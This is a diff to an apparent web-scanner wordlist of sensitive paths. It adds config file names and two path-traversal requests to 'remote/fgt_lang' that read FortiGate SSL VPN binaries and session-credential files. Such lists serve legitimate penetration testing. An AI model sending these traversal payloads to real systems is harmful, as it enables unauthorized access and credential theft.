@@ -1,4 +1,3 @@
-
 !.gitignore
 !.htaccess
 !.htpasswd
@@ -1590,6 +1589,7 @@ config/AppData.config
 config/autoload/
 config/aws.yml
 config/banned_words.txt
+config/config.inc
 config/config.ini
 config/database.yml
 config/database.yml.pgsql
@@ -1597,6 +1597,7 @@ config/database.yml.sqlite3
 config/database.yml_original
 config/database.yml~
 config/databases.yml
+config/db.inc
 config/development/
 config/initializers/secret_token.rb
 config/master.key
@@ -2847,7 +2848,7 @@ nytprof.out
 obj/
 odbc
 Office/
-Office/graph.php#xxe
+Office/graph.php
 olap/
 old
 old.htaccess
@@ -3384,6 +3385,8 @@ relogin
 relogin.htm
 relogin.html
 relogin.php
+remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
+remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
 request.log
 rerun.txt
 reseller
@@ -4050,6 +4053,7 @@ vqmod/logs/
 vqmod/mods.cache
 vqmod/vqcache/
 vtiger/
+vtigercrm/
 vtund.conf
 w.php
 wallet.dat
